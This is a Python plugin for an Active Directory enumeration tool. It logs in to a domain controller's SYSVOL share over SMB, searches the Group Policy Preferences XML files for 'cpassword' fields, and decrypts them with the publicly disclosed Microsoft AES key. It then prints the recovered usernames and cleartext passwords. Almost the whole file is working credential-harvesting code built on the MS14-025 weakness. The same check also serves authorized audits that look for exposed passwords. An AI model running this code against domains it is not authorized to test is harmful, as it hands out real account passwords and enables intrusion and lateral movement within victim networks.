import os
import io
import base64
import logging
import binascii
import tempfile
import xml.etree.ElementTree as ET

from ad.password import MyMD4Class

import smb
from smb.SMBConnection import SMBConnection
from smb.smb_constants import *


# refs
#   1. https://glanfield.co.uk/make-group-policy-preferences-guid-again/
#   2. https://blogs.technet.microsoft.com/mempson/2010/12/01/group-policy-client-side-extension-list/
GP_CSE_GUIDS = {
    '{5794DAFD-BE60-433f-88A2-1A31939AC01F}':'Drives.xml',
    '{17D89FEC-5C44-4972-B12D-241CAEF74509}':'Groups.xml',
    '{B087BE9D-ED37-454f-AF9C-04291E351182}':'Registry.xml',
    '{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}':'ScheduledTasks.xml',
    '{728EE579-943C-4519-9EF7-AB56765798ED}':'DataSources.xml',
    '{91FBB303-0CD5-4055-BF42-E512A681B325}':'Services.xml',
    '{BC75B1ED-5833-4858-9BB8-CBF0B166DF9D}':'Printers.xml'
}

'''
References

https://adsecurity.org/?p=2288

Powershell script for discovering GPP
https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati
'''

logger = logging.getLogger(__name__)

PLUGIN_NAME = 'gpp'
PLUGIN_INFO = 'Check Group Policy Preferences for creds'

g_parser = None

def get_parser():
    return g_parser

def list_sysvol(conn, path, attrs=0, filt='*'):
    try:
        files = conn.listPath('SYSVOL', path, attrs, filt)
        return files
    except:
        return []

# ref: https://msdn.microsoft.com/en-us/library/cc422924.aspx
AES_KEY=binascii.unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
def extract_cpassword(data, folder):
    from Crypto.Cipher import AES
    r = ET.fromstring(data)
    creds = []
    parents = {c:p for p in r.iter() for c in p}
    for p in r.findall('.//Properties[@cpassword]'):
        user = ''
        if folder.lower() in ['groups', 'drives']:
            for a in ['newName', 'userName', 'name']:
                user = p.get(a, '')
                if len(user):
                    break
        else:
            user = p.get('runAs', '')
        cpass = p.get('cpassword', '')
        if len(user) == 0 or len(cpass) == 0:
            continue
        mod = len(cpass) % 4
        if mod == 1:
            cpass = cpass[:-1]
        elif mod in [2, 3]:
            cpass += '=' * (4-mod)
        aes = AES.new(AES_KEY, AES.MODE_CBC, IV=b'\x00'*16)
        pw = aes.decrypt(base64.b64decode(cpass))
        pad = pw[-1]
        pw = pw[:-pad].decode('utf-16-le')
        creds.append({'user':user, 'pass':pw, 'changed':parents[p].get('changed')})
    return creds

def get_gpo_paths(conn):
    ''' TODO test this. should replace recursive search for relevant .xml files in handler().
    ref: https://glanfield.co.uk/make-group-policy-preferences-guid-again/ '''
    paths = []
    for g in GP_CSE_GUIDS.keys():
        for r in conn.searchg(conn.default_search_base,
                              '(gPCMachineExtensionNames=*{}*)'.format(g), attributes=['gPCFileSysPath']):
            paths.append((r['attributes']['gPCFileSysPath'][0]))
    return paths

def handler(args, ldap_conn):
    ''' look for files sysvol\domain\policies\{GUID}\*\Preferences\*\*.xml containing "cpassword" '''
    dc_hostname = args.hostname or args.server
    if args.nthash:
        smb.ntlm.MD4 = MyMD4Class.new
    conn = SMBConnection(args.username, args.password, 'adenum', dc_hostname, use_ntlm_v2=True,
                         domain=args.domain, is_direct_tcp=(args.smb_port != 139))
    conn.connect(args.server, port=args.smb_port)
    logger.debug('Connecting to \\\\{}\\sysvol'.format(args.server))
    # TODO: for path in get_gpo_paths(ldap_conn):
    for p in list_sysvol(conn, args.domain+r'\Policies', SMB_FILE_ATTRIBUTE_DIRECTORY, '{*}'):
        if p.isDirectory:
            for mu in ['USER', 'MACHINE']:
                pref = '\\'.join([args.domain, 'Policies', p.filename, mu, 'Preferences'])
                logger.debug('PREF '+pref)
                for t in list_sysvol(conn, pref, SMB_FILE_ATTRIBUTE_DIRECTORY):
                    if t.filename.lower() in ['groups', 'drives', 'scheduledtasks', 'datasources', 'services', 'printers', 'registry']:
                        path = '\\'.join([pref, t.filename])
                        for x in list_sysvol(conn, path, 55, '*.xml'):
                            if x.file_size > 0:
                                get = '\\'.join([pref, t.filename, x.filename])
                                logger.debug('GET '+get)
                                tmp = io.BytesIO()
                                a, n = conn.retrieveFile('SYSVOL', get, tmp)
                                creds = extract_cpassword(tmp.getvalue().decode('utf-8'), t.filename)
                                if len(creds):
                                    print('File:', get)
                                    for c in creds:
                                        print('    User    "{}"'.format(c['user']))
                                        print('    Pass    "{}"'.format(c['pass']))
                                        print('    Changed  {}'.format(c['changed']))
                                        print()
    conn.close()


def get_arg_parser(subparser):
    global g_parser
    if not g_parser:
        g_parser = subparser.add_parser(PLUGIN_NAME, help=PLUGIN_INFO)
        g_parser.set_defaults(handler=handler)
    return g_parser
